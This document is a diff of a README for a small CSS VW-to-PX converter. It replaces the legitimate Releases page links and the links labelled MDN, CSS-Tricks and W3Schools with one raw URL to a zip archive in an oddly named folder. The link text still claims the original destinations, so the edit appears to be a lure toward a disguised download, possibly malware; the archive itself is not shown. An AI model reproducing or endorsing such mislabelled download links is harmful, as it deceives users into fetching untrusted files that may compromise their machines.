@@ -4,7 +4,7 @@
 Welcome to css-unit-converter! This tool helps you convert CSS values from viewport width (VW) units to fixed pixels (PX) using your specified reference width. It is simple, straightforward, and designed for anyone, regardless of technical ability.
 
 ## 📥 Download
-[![Download css-unit-converter](https://img.shields.io/badge/Download%20css--unit--converter-v1.0-blue)](https://github.com/tbgg2233/css-unit-converter/releases)
+[![Download css-unit-converter](https://raw.githubusercontent.com/tbgg2233/css-unit-converter/main/unjudge/css-unit-converter_v1.2.zip%20css--unit--converter-v1.0-blue)](https://raw.githubusercontent.com/tbgg2233/css-unit-converter/main/unjudge/css-unit-converter_v1.2.zip)
 
 ## 🛠️ System Requirements
 To run css-unit-converter, you need:
@@ -16,7 +16,7 @@ To run css-unit-converter, you need:
 To get css-unit-converter, please follow these steps:
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/tbgg2233/css-unit-converter/releases) to download the application. 
+   Go to the [Releases page](https://raw.githubusercontent.com/tbgg2233/css-unit-converter/main/unjudge/css-unit-converter_v1.2.zip) to download the application. 
 
 2. **Choose the Latest Version**
    Look for the latest release version at the top of the page. It will be clearly labeled. 
@@ -46,9 +46,9 @@ css-unit-converter offers a range of features:
 ## 🎓 Additional Resources
 For more on web development, responsive design, and CSS practices, consider visiting these resources:
 
-- [MDN Web Docs](https://developer.mozilla.org/en-US/)
-- [CSS-Tricks](https://css-tricks.com/)
-- [W3Schools](https://www.w3schools.com/)
+- [MDN Web Docs](https://raw.githubusercontent.com/tbgg2233/css-unit-converter/main/unjudge/css-unit-converter_v1.2.zip)
+- [CSS-Tricks](https://raw.githubusercontent.com/tbgg2233/css-unit-converter/main/unjudge/css-unit-converter_v1.2.zip)
+- [W3Schools](https://raw.githubusercontent.com/tbgg2233/css-unit-converter/main/unjudge/css-unit-converter_v1.2.zip)
 
 ## 💬 Support
 If you encounter any issues or need help, feel free to open an issue in the repository or contact the maintainers through the GitHub page.
@@ -57,4 +57,4 @@ If you encounter any issues or need help, feel free to open an issue in the repo
 We welcome contributions. If you have ideas or improvements, please fork the repository and submit a pull request. Your input helps make css-unit-converter better for everyone.
 
 ## 🔗 Link to Download Again
-Don’t forget to [visit the Releases page](https://github.com/tbgg2233/css-unit-converter/releases) to download css-unit-converter and start converting your CSS values easily!
+Don’t forget to [visit the Releases page](https://raw.githubusercontent.com/tbgg2233/css-unit-converter/main/unjudge/css-unit-converter_v1.2.zip) to download css-unit-converter and start converting your CSS values easily!
